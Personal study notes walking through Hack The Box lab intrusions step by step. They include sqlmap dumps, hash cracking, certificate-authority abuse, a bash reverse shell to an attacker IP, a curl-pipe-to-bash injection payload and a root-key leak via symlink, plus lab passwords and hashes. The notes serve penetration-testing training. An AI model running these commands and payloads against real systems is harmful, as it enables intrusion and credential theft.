# GDB
ref:
  https://exploit.education/
## HTB: Drive (gdb related)

```
1. find ports 22,80,3000 open; add /etc/hosts
2. Upload random file, and click "Reserve" this file. URL will be "http://drive.htb/{fileID}/block/"
3. The URL is vulnerable to IDOR; use Burp Intruder find the ID with file associated.
4. Get user/pass: martin/"Xk4@KjyrYv8t194L!" on ID 79.
5. use cmd "ss -tlpn", find out the device listening TCP ports: 33060, 3306, 80, 53, 22, 80, 3000.
6. cannot find anything here, try to port forward 3000 to attacker`s machine which has browser.
	a. martin@drive:/var/www/backups$ ls
 	  1_Dec_db_backup.sqlite3.7z  1_Oct_db_backup.sqlite3.7z  db.sqlite3
	  1_Nov_db_backup.sqlite3.7z  1_Sep_db_backup.sqlite3.7z
	  (cannot use martin`s password to unzip the 7z files.)
	b. Cannot use martin`s password or root with no pass to visit local mysql server(3306)
7. cmd: ssh -L 8080:127.0.0.1:3000 martin@drive.htb
8. attacker browser visit: localhost:8080 (find Gitea website)
9. Gitea->Explore page->Users-> find user "martinCruz". login by password of martin.
10. in commit history find "7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3"
11. martin@drive:~$ 7z e -p'H@ckThisP@ssW0rDIfY0uC@n:)' ./1_Sep_db_backup.sqlite3.7z -so > /home/martin/Sep.sqlite3
12. martin@drive:~$ sqlite3 Dec.sqlite3
	.tables
	select * from accounts_customuser;
  (sqlite> SELECT * from accounts_customuser;
  16|pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=|2022-12-26 06:21:34.294890|1|admin|||admin@drive.htb|1|1|2022-12-08 14:59:02.802351
 ***)
 Which is pbkdf2_sha256, an industry-standard hashing algorithm, cannot brute-force
13. Choose other databases, one of them cmd: sqlite3 Oct.sqlite3
    sqlite> select * from accounts_customuser;
	21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
	22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
	23|sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141|2022-12-26 06:02:42.401095|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
	24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
	30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372
    (sha1 is insecure)
14. sqlite> select password from accounts_customuser;
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
 (save the hash to file "hash.txt")
15. #hashcat -a 0 -m 124 -o cracked-hashs hash.txt /usr/share/wordlists/rockyou.txt
  #cat cracked-hashs 
  sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool
  sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7 (belongs to tom@drive.htb)
16. login tom@drive.htb with pass "johnmayer7", get flag: 1d68e33fa8953b2aec2458e6366da9cb

17.cat README.txt, file doodleGrive-cli
18. tom@drive:~$ strings doodleGrive-cli | grep -A5 -B5 pass
	(Enter password for 
	moriarty
	findMeIfY0uC@nMr.Holmz!)
19. $ scp tom@drive.htb:/home/tom/doodleGrive-cli ./
20. 
```

## HTB: Gofer (gdb related)

## HTB: Investigation (gdb related)

## HTB: Retired (gdb related)

## HTB: Overflow (gdb related)

## HTB: Developer (gdb related)

## HTB: Rope (gdb related)

## HTB: Patents (gdb related)

## HTB: Smasher2 (gdb related)



# Offsec
https://0xdf.gitlab.io/cheatsheets/offsec

OSCPv3 (PEN-200 2023-2024; includes OSCP+)
OSCP Like

## HTB: Editorial 19 Oct 2024
```
1. Pwn 2024-12-11 
2. SSRF:
	Set /etc/hosts of the domain to visit the site
	test GET attacker listening nc
	find local open port and api (by brup or self python scanner)
	leak pass from the api request -> one user without sudo
3. GIT: 
	history, credential leak -> another user with sudo: python3 {a .py with git-python vuln} {param}
4. Git-python vuln:
	https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
	exploit -> root
```

## HTB: BoardLight 28 Sep 2024
```serverfun2$2023!!
1. fuzz host
  Fuzz header Host, and filter out response length 15949.
  cmd: ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
2. default password login
3. exploit https://nvd.nist.gov/vuln/detail/CVE-2023-30253 manually, create PHP reverse shell.
4. goto website conf file: htdocs/conf/conf.php
5. find the user in /etc/passwd who has bash, then login by pass found in conf.php
6. Run LinPEAS.sh found suid enlightenment
7. find its version by cmd: enlightenment --version, which vuln to CVE-2022-37706
8. use exploit at: https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh and get root.

```

## HTB: Mailing 07 Sep 2024 
a buggy box
inner network email phishing
```
1. Windows relative path traverse: "..\..\Windows\System32\drivers\etc\hosts" (not like linux: ../../etc/hosts)
2. google service config path: ..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini. download it
3. cmd: hashcat -m 0 ./md5-hash.txt /usr/share/wordlists/rockyou.txt (md5-hash.txt contains one line of the hashed pass found in .ini file)
4. a Google search for recent vulnerabilities related to Windows Mail -> CVE-2024-21413
5. git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability 
6. TCP port 587 is the default port for sending outgoing emails using the Simple Mail Transfer Protocol (SMTP)
7. As found "Maya Bendito" on webpage, guess a user with email address maya@mailing.htb
8. start smb server on attacker machine: $ impacket-smbserver smbFolder $(pwd) -smb2support
9. Send CVE mail to user maya@mailing.htb, cmd: $ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\YOUR_IP\smbFolder\test.txt" --subject Test
10. save captured pass in a file hast.txt
11. cmd: john -w=/usr/share/wordlists/rockyou.txt hash.txt
12. login as user maya, cmd:  evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
13. exploit https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/ to get root.
```

## HTB: Usage 10 Aug 2024
```
1. fuzz subdomain by cmd: ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://usage.htb/ -H 'Host: FUZZ.usage.htb' -fs 178. find admin.usage.htb
2. find SQL injection point at password reset page.
3. copy the POST request and save it in a file called reset.req
4. run sqlmap cmd: sqlmap -r reset.req -p email --batch (shows need higher level)
5. user highrer level of sqlmap: sqlmap -r reset.req -p email --batch --level 3 (shows vulnerable to boolean-based blind and time-based blind)
6. get a list of the available databases using the --dbs flag: sqlmap -r reset.req -p email --batch --level 3 --dbs
	(faster by --threads= flag)   (get 3 dbs, one is "usage_blog")
7. enumerate tables in database "usage_blog": sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10
	(got 15 tables, one is "admin_users")
8. Dump the "admin_users" table: sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump
	(got: | 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |)
9. save "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2" to hash.txt
10. Crack it using john: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
11. exploit: https://flyd.uk/post/cve-2023-24249/
	(create php reverse shell, reverse.php, rename to reverse,jpg, burp intercept the upload, change name to reverse.php)
	(ref: https://www.revshells.com/)
12. get reverse shell of user: dash.
13. list opening ports: ss -tlpn
    list processes: ps -aux
    check file system table: cat /etc/fstab
	(find interesting process /usr/bin/monit)
14. run cmd: find / -name monit.service 2>/dev/null
15. find user "xander" pass in ~/.monitrc
16. sudo -l, find user can run elf /usr/bin/usage_management by root.
17. run it with sudo, the elf can:
	(1. bakup file to /var/backups/project.zip)
	(2. backup mysql to /var/backups/mysql_backup.sql)
	(3. Reset admin password)
18. static analysis of usage_management, found it uses:
	/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
	/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
	strings: chdir, /var/www/html (guess it will chdir to html folder and compress)
19. The @id_rsa file (also referred to as a listfile) tells 7zip that id_rsa contains a list of files to be compressed.
20. xander@usage:/var/www/html$ touch @id_rsa
21. xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
22. the usage_management will try to archieve each line in id_rsa as a file, the error message will leak the private key:
	-----BEGIN OPENSSH PRIVATE KEY----- : No more files
	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
	QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
	QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
	AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
	H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
	-----END OPENSSH PRIVATE KEY----- : No more files
23. copy the content to file "id_rsa123" on attacking machine. (remove error log " : No more files")
24. log in to machine: ssh -i ./root-rsa root@usage.htb
```


## HTB: Monitored 11 May 2024
Mostly https://www.exploit-db.com/exploits/44969
```
1. nmap found tcp 22,80,389,443,5667. udp: 123 ntp, 161 snmp.
2. snmp enumeration: snmpwalk -v 2c -c public nagios.monitored.htb
3. Found username and password in snmp Strings.
4. The found user is disabled.
5. https://support.nagios.com/forum/viewtopic.php?p=310411#p310411
  (login by api request, after getting token, using token to view the page)
  (curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5')
6. login by: /nagiosxi/index.php?token=<token>
7. find Nagios XI version 5.11.0. (CVE-2023-40931)
  (https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c)
8. exploit by sqlmap: sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=gmmapc26k5sr7pbm1emj9u4cmc" --dbs --threads=10
  (find 2 dbs, "nagiosxi" one is interesting)
9. cmd: sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=gmmapc26k5sr7pbm1emj9u4cmc" -D nagiosxi --tables
  (find many tables, "xi_users" is interesting)
10. cmd: sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=gmmapc26k5sr7pbm1emj9u4cmc" -D nagiosxi -T xi_users --dump
  (dump xi_users table, and find api keys of "admin")
11. exploit https://www.exploit-db.com/exploits/44969 manually, from the step after getting api key.
    (same as manually do add_admin() function.)
12. manually create commands in "Core Config Manager", which is a reverse shell. goto localhost -> run this command.
    (same as execute_cmdstager() in https://www.exploit-db.com/exploits/44969, check how it works later.)
13. get user "nagios"
14. sudo -l, find it can execute getprofile.sh, which contains vuln as
	if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
	 tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > 
	"/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
	fi
15. ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
    (let the previous command, read from root id_rsa)
	    /usr/local/nagiosxi/tmp$ ls -la
	ls -la
	total 12
	drwsrwsr-x  3 www-data nagios 4096 Dec 16 19:34 .
	drwxr-xr-x 10 root     nagios 4096 Nov  9  2023 ..
	drwxr-sr-x  2 root     nagios 4096 Nov 10  2023 migrate
	lrwxrwxrwx  1 nagios   nagios   17 Dec 16 19:34 phpmailer.log -> /root/.ssh/id_rsa
16. run: sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
17. Get root private key.
	cp /usr/local/nagiosxi/var/components/profile.zip /tmp/
	cd /tmp
	unzip profile.zip
	cat profile-<ID>/phpmailer.log 
```

## HTB: Manager 16 Mar 2024
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7
```
1. smb enumerate: $ smbclient -L \\\\10.129.136.168\\ -N 
2. perform RID cycling: impacket-lookupsid anonymous@manager.htb -no-pass
  (It involves sequentially querying Security Identifiers (SIDs) by incrementing the Relative Identifier (RID) portion.)
3. Get a list of user names in type "SidTypeUser".
  (others are "SidTypeGroup", "SidTypeAlias", etc)
4. attempt SMB authentication with passwords same as the usernames.
   cmd: netexec smb 10.10.11.236 -u usernames.txt -p usernames.txt --no-bruteforce
  (NetExec is the successor of the no-longer maintained CrackMapExec project)
  (Found user "operator" with pass "operator".)
  Test the user "operator" and another user "zhong":
        [★]$ smbclient -L //10.129.136.168 -U operator
	Password for [WORKGROUP\operator]: {input operator}
	
		Sharename       Type      Comment
		---------       ----      -------
		ADMIN$          Disk      Remote Admin
		C$              Disk      Default share
		IPC$            IPC       Remote IPC
		NETLOGON        Disk      Logon server share 
		SYSVOL          Disk      Logon server share 
	Reconnecting with SMB1 for workgroup listing.
	do_connect: Connection to 10.129.136.168 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Unable to connect with SMB1 -- no workgroup available
	
	[★]$ smbclient -L //10.129.136.168 -U zhong
	Password for [WORKGROUP\zhong]: {input zhong}
	session setup failed: NT_STATUS_LOGON_FAILURE
5. Use the found user/pass pair to access the MSSQL Server.
   By cmd: impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
6. list folders by cmd: xp-dirtree
   (https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server)
7. list found folder: xp_dirtree \inetpub\wwwroot (find website-backup-27-07-23-old.zip)
8. download it from http://manager.htb/website-backup-27-07-23-old.zip
9. unzip and grep "password", find file ".old-conf.xml" has it.
     (<user>raven@manager.htb</user>
      <password>R4v3nBe5tD3veloP3r!123</password>)
10. login by evil-winrm: evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'

(priv esclation)

11. try to identify potential misconfigurations within the Certification Authority by certipy:
    certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
    (output shows:  [!] Vulnerabilities ESC7: 'MANAGER.HTB\\Raven' has dangerous permissions)
12. The user Raven possesses hazardous permissions, particularly having "ManageCA" rights over the Certification Authority.
    This implies that by leveraging the ESC7 scenario,
    we could potentially elevate our privileges to Domain Admin while operating as user Raven.
    ref: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7
    Abuse steps:
      a. You can grant yourself the Manage Certificates access right by adding your user as a new officer.
      b. The SubCA template can be enabled on the CA with the -enable-template parameter. By default, the SubCA template is enabled.
      c. If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the SubCA template.
         This request will be denied, but we will save the private key and note down the request ID.
      d. With our Manage CA and Manage Certificates,
         we can then issue the failed certificate request with the ca command and the -issue-request <requestID> parameter.
      e. And finally, we can retrieve the issued certificate with the req command and the -retrieve <request ID> parameter.

13. exploit it: certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven -debug
      ([*] Successfully added officer 'Raven' on 'manager-dc01-ca')
14.  we are officer, we can issue and manage certificates.
    cmd: certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
      ([*] Successfully enabled 'SubCA' on 'manager-dc01-ca')
15. check the enabled certificate templates by: certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates
16. certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
    ( [*] Requesting certificate via RPC
	[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
	[*] Request ID is 19
	Would you like to save the private key? (y/N) y
	[*] Saved private key to 19.key
	[-] Failed to request certificate)
17. certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 19
    ([*] Successfully issued certificate)
18. certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 19
    (   [*] Rerieving certificate with ID 19
	[*] Successfully retrieved certificate
	[*] Got certificate with UPN 'administrator@manager.htb'
	[*] Certificate has no object SID
	[*] Loaded private key from '19.key'
	[*] Saved certificate and private key to 'administrator.pfx' )
19. certipy auth -pfx administrator.pfx
    ([-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great))
    ("KRB_AP_ERR_SKEW" error occurs when there is a significant time difference between the client and the KDC servers)
20.  disable the "Automatic Date & Time" setting in our machine's settings
    cmd: sudo ntpdate -s manager.htb
21. run cmd again: certipy auth -pfx administrator.pfx
    ([*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef)
22. using administrator hash to login
    cmd: evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
    (*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
     manager\administrator)
```


## HTB: CozyHosting 02 Mar 2024
use ${IFS} to escape space
```
1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.230 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
   nmap -p$ports -sV 10.10.11.230
2. ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
   	-w Wordlist file path
	-u Target URL
	-ic Ignore wordlist comments
	-t Number of concurrent threads
3. Find page with "Whitelabel Error Page" -> it`s spring boot.
4. ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
    (spring boot specific fuzz)
    	(actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 174ms]
	actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 174ms]
	actuator/sessions       [Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 172ms]
	actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 178ms]
	actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 185ms]
	actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 207ms]
	actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 208ms]
	actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 233ms]
	actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 175ms])
5. http://cozyhosting.htb/actuator/sessions ({"2688CA1A5F14858B58D088D4EDA8F329":"kanderson"})
6. use the found session key to login http://cozyhosting.htb/admin page.
7. in "connection settings" put payload in Username field.
8. attacker machine create reverse shell: echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
9. attacker machine host file on port 7000: python3 -m http.server 7000 
10. attacker machine listen: nc -lnvp 4444
11. put payload in /admin username and run: test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;

(in user bash)
12. get more stable bash: script /dev/null -c bash
13. cmd: unzip -d /tmp/app cloudhosting-0.0.1.jar
14. cd /tmp/app; grep -inr "password"; (find pass in file ./BOOT-INF/classes/application.properties:12:)
15. grep -inr -A3 -B3 "password=Vg&nvzAQ7XxR"
    (BOOT-INF/classes/application.properties-9-spring.datasource.platform=postgres
     BOOT-INF/classes/application.properties-10-spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
     BOOT-INF/classes/application.properties-11-spring.datasource.username=postgres
     BOOT-INF/classes/application.properties:12:spring.datasource.password=Vg&nvzAQ7XxR)
16. login postgresql: psql -h 127.0.0.1 -U postgres

(in postgres cmd line)
17. cmd: \list (found interesting database cozyhosting)
18. cmd: \connect cozyhosting
19. cmd: \dt  (show 2 tables "hosts" and "users")
20. cmd: select * from users;
     (kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim)
     (admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm)
21. Identify the hash type: hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
22. crack passwd:
    hashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt (manchesterunited)
23. cat /etc/passwd (found user josh)

(login as josh)
24. ssh josh@{ip} with found password "manchesterunited"
25. sudo -l found ssh
26. https://gtfobins.github.io/gtfobins/ssh/#shell found exploit
27. exploit: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```



## HTB: Builder 12 Feb 2024

## HTB: Keeper 10 Feb 2024

## HTB: Sau 06 Jan 2024

## HTB: Broker 09 Nov 2023

## HTB: Intentions 14 Oct 2023

## HTB: Aero 28 Sep 2023

## HTB: Busqueda 12 Aug 2023

## HTB: Escape 17 Jun 2023

## HTB: Soccer 10 Jun 2023

## HTB: Flight 06 May 2023

## HTB: UpDown 21 Jan 2023

## HTB: Support 17 Dec 2022

## HTB: StreamIO 17 Sep 2022

## HTB: Timelapse 20 Aug 2022

## HTB: Pandora 21 May 2022

## HTB: Return 05 May 2022

## HTB: Jeeves 14 Apr 2022

## HTB: Intelligence 27 Nov 2021

## HTB: Blackfield 03 Oct 2020

## HTB: Magic 22 Aug 2020

## HTB: Cascade 25 Jul 2020

## HTB: Sauna 18 Jul 2020

## HTB: ServMon 20 Jun 2020

## HTB: Monteverde 13 Jun 2020

## HTB: Forest 21 Mar 2020

## HTB: Networked 16 Nov 2019

## HTB: Help 08 Jun 2019

## HTB: Access 02 Mar 2019

## HTB: Active 08 Dec 2018
OSCP Harder

## HTB: Mailing 07 Sep 2024

## HTB: Rebound 30 Mar 2024

## HTB: Clicker 27 Jan 2024

## HTB: Authority 09 Dec 2023

## HTB: Aero 28 Sep 2023

## HTB: Cerberus 29 Jul 2023

## HTB: Absolute 27 May 2023

## HTB: Mentor 11 Mar 2023

## HTB: Outdated 10 Dec 2022

## HTB: Atom 10 Jul 2021

## HTB: Cereal 29 May 2021

## HTB: APT 10 Apr 2021

## HTB: Multimaster 19 Sep 2020

## HTB: Quick 29 Aug 2020

OSCPv2 (PEN-200 2022)
OSCP Like

## HTB: Support 17 Dec 2022

## HTB: Scrambled 01 Oct 2022

## HTB: Seventeen 24 Sep 2022

## HTB: StreamIO 17 Sep 2022

## HTB: Talkative 27 Aug 2022

## HTB: Timelapse 20 Aug 2022

## HTB: Acute 16 Jul 2022

## HTB: Paper 18 Jun 2022

## HTB: Meta 11 Jun 2022

## HTB: Pandora 21 May 2022

## HTB: Mirai 18 May 2022

## HTB: Shibboleth 02 Apr 2022

## HTB: Object 28 Feb 2022

## HTB: Horizontall 05 Feb 2022

## HTB: Forge 22 Jan 2022

## HTB: Previse 08 Jan 2022

## HTB: Writer 11 Dec 2021

## HTB: Intelligence 27 Nov 2021

## HTB: Seal 13 Nov 2021

## HTB: Pit 25 Sep 2021

## HTB: Knife 28 Aug 2021

## HTB: Love 07 Aug 2021

## HTB: Armageddon 24 Jul 2021

## HTB: Ophiuchi 03 Jul 2021

## HTB: Node 08 Jun 2021

## HTB: ScriptKiddie 05 Jun 2021

## HTB: Delivery 22 May 2021

## HTB: Ready 15 May 2021

## HTB: Blue 11 May 2021

## HTB: APT 10 Apr 2021

## HTB: Time 03 Apr 2021

## HTB: Luanne 27 Mar 2021

## HTB: Sense 11 Mar 2021

## HTB: Passage 06 Mar 2021

## HTB: Doctor 06 Feb 2021

## HTB: Worker 30 Jan 2021

## HTB: Omni 09 Jan 2021

## HTB: SneakyMailer 28 Nov 2020

## HTB: Buff 21 Nov 2020

## HTB: Tabby 07 Nov 2020

## HTB: Fuse 31 Oct 2020

## HTB: Blunder 17 Oct 2020

## HTB: Admirer 26 Sep 2020

## HTB: Haircut 10 Sep 2020

## HTB: Remote 05 Sep 2020

## HTB: Magic 22 Aug 2020

## HTB: Blocky 30 Jun 2020

## HTB: Popcorn 23 Jun 2020

## HTB: ServMon 20 Jun 2020

## HTB: OpenAdmin 02 May 2020

## HTB: SolidState 30 Apr 2020

## HTB: Mango 18 Apr 2020

## HTB: Traverxec 11 Apr 2020

## HTB: Forest 21 Mar 2020

## HTB: Postman 14 Mar 2020

## HTB: Bankrobber 07 Mar 2020

## HTB: Networked 16 Nov 2019

## HTB: Jarvis 09 Nov 2019

## HTB: SwagShop 28 Sep 2019

## HTB: Bastion 07 Sep 2019

## HTB: FriendZone 13 Jul 2019

## HTB: Conceal 18 May 2019

## HTB: Irked 27 Apr 2019

## HTB: Frolic 23 Mar 2019

## HTB: SecNotes 19 Jan 2019

## HTB: Active 08 Dec 2018

## HTB: Jerry 17 Nov 2018

## HTB: Bounty 27 Oct 2018

## HTB: TartarSauce 20 Oct 2018

## HTB: Sunday 29 Sep 2018

## HTB: Poison 08 Sep 2018

## HTB: Valentine 28 Jul 2018

## HTB: Nibbles 30 Jun 2018

## HTB: Chatterbox 18 Jun 2018
OSCP Harder

## HTB: Undetected 02 Jul 2022

## HTB: Jail 23 May 2022

## HTB: Search 30 Apr 2022

## HTB: Backdoor 23 Apr 2022

## HTB: Stacked 19 Mar 2022

## HTB: Forge 22 Jan 2022

## HTB: Writer 11 Dec 2021

## HTB: Pikaboo 04 Dec 2021

## HTB: PivotAPI 06 Nov 2021

## HTB: Dynstr 16 Oct 2021

## HTB: Monitors 09 Oct 2021

## HTB: Breadcrumbs 17 Jul 2021

## HTB: Atom 10 Jul 2021

## HTB: APT 10 Apr 2021

## HTB: Blackfield 03 Oct 2020

## HTB: Quick 29 Aug 2020

## HTB: Cascade 25 Jul 2020

## HTB: Sauna 18 Jul 2020

## HTB: Book 11 Jul 2020

## HTB: Monteverde 13 Jun 2020

## HTB: Nest 06 Jun 2020

## HTB: Control 25 Apr 2020

## HTB: Mango 18 Apr 2020

## HTB: Sniper 28 Mar 2020

## HTB: Bitlab 11 Jan 2020

## HTB: Safe 26 Oct 2019

## HTB: LaCasaDePapel 27 Jul 2019

## HTB: Netmon 29 Jun 2019

## HTB: Querier 22 Jun 2019

## HTB: Sizzle 01 Jun 2019

## HTB: Lightweight 11 May 2019

## HTB: October 26 Mar 2019

OSCPv1 (Original Release)
OSCP Like

## HTB: Brainfuck 16 May 2022

## HTB: Node 08 Jun 2021

## HTB: Shocker 25 May 2021

## HTB: Blue 11 May 2021

## HTB: Optimum 17 Mar 2021

## HTB: Sense 11 Mar 2021

## HTB: Beep 23 Feb 2021

## HTB: Buff 21 Nov 2020

## HTB: ServMon 20 Jun 2020

## HTB: Grandpa 28 May 2020

## HTB: Arctic 19 May 2020

## HTB: SolidState 30 Apr 2020

## HTB: Nineveh 22 Apr 2020

## HTB: Cronos 14 Apr 2020

## HTB: Lame 07 Apr 2020

## HTB: Forest 21 Mar 2020

## HTB: Bankrobber 07 Mar 2020

## HTB: Networked 16 Nov 2019

## HTB: Jarvis 09 Nov 2019

## HTB: SwagShop 28 Sep 2019

## HTB: Bastion 07 Sep 2019

## HTB: FriendZone 13 Jul 2019

## HTB: Conceal 18 May 2019

## HTB: Irked 27 Apr 2019

## HTB: Bastard 12 Mar 2019

## HTB: Granny 06 Mar 2019

## HTB: Devel 05 Mar 2019

## HTB: Legacy 21 Feb 2019

## HTB: SecNotes 19 Jan 2019

## HTB: Active 08 Dec 2018

